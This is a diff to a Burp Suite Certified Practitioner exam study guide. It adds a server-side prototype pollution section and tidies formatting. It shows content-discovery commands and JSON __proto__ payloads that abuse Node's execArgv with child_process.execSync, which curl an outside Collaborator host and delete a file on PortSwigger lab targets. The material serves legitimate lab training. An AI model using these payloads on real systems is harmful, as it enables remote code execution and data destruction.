@@ -28,6 +28,7 @@
 [XXE - XML entities & Injections](#xxe-injections)  
 [SSRF - Server side request forgery](#ssrf---server-side-request-forgery)  
 [SSTI - Server side template injection](#ssti---server-side-template-injection)  
+[SSPP - Server Side Prototype Pollution](#sspp---server-side-prototype-pollution)  
 [LFI - File path traversal](#file-path-traversal)  
 [File Uploads](#file-uploads)  
 [Deserialization](#deserialization)  
@@ -49,7 +50,7 @@
   
 # Content Discovery  
 
->Enumeration of target start with fuzzing web directories and files. Either use the Burp engagement tools, content discovery option to find hidden paths and files or use ```FFUF``` to enumerate web directories and files. Looking at ```robots.txt``` or ```sitemap.xml``` that can reveal content.  
+>Enumeration of target start with fuzzing web directories and files. Either use the Burp engagement tools, content discovery option to find hidden paths and files or use `FFUF` to enumerate web directories and files. Looking at `robots.txt` or `sitemap.xml` that can reveal content.  
 
 ```bash
 wget https://raw.githubusercontent.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/main/wordlists/burp-labs-wordlist.txt
@@ -61,7 +62,7 @@ ffuf -c -w ./burp-labs-wordlist.txt -u https://TARGET.web-security-academy.net/F
 
 ![content-discovery.png](images/content-discovery.png)  
 
->Examine the git repo branches on local downloaded copy, using ```git-cola``` tool. Then select **Undo last commit** and extract admin password from the diff window.  
+>Examine the git repo branches on local downloaded copy, using `git-cola` tool. Then select **Undo last commit** and extract admin password from the diff window.  
 
 ```
 wget -r https://TARGET.web-security-academy.net/.git/
@@ -132,7 +133,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ### Vuln AngularJS  
   
->AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is ***identified*** by noticing the search string is enclosed in an **ng-app** directive and ```/js/angular 1-7-7.js``` script included. Review the HTML code to ***identify*** the ```ng-app``` directive telling AngularJS that this is the root element of the AngularJS application.  
+>AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is ***identified*** by noticing the search string is enclosed in an **ng-app** directive and `/js/angular 1-7-7.js` script included. Review the HTML code to ***identify*** the `ng-app` directive telling AngularJS that this is the root element of the AngularJS application.  
 
 ![domxss-on-constructor.png](images/ng-app-code-review.png)  
 
@@ -2818,6 +2819,48 @@ wrtz{{#with "s" as |string|}}
 [PortSwigger Research SSTI](https://portswigger.net/research/server-side-template-injection)  
 
 >Note: ***Identify*** the Update forgot email template message under the admin_panel at the path /update_forgot_email.  
+
+-----
+
+## SSPP - Server Side Prototype Pollution  
+
+>The application run `Node.js` and the Express framework. It is vulnerable to server-side prototype pollution (SSPP) because it unsafely merges user-controllable input into a server-side JavaScript object.  
+
+>SSPP Exploit steps:  
+
+1. Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.  
+2. Identify a gadget that you can use to inject and execute arbitrary system commands.  
+3. Trigger remote execution of a command that deletes the file /home/carlos/morale.txt.  
+
+>***Identify*** prototype pollution  
+
+```JSON
+"__proto__": {
+    "json spaces":10
+}
+```  
+
+>Test for remote code execution (RCE) by performing DNS request from back-end.  
+
+```JSON
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
+    ]
+}
+```  
+
+Inject exploit in to read or delete user sensitive data.  
+
+```JSON
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
+    ]
+}
+``` 
+
+[PortSwigger Lab: Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)  
 
 -----
 
